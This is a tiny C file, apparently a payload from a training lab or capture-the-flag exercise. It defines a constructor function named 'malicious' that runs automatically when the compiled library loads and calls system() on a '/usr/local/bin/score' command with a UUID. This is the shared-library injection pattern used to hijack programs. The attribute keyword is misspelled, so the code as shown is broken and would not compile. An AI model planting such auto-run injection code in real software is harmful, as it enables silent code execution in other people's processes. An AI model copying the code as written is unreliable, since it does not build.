#include<stdio.h>
#include<stdlib.h>

static void malicious() __atribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 42262cab-2a0e-4882-971e-47f7a4770369");
}
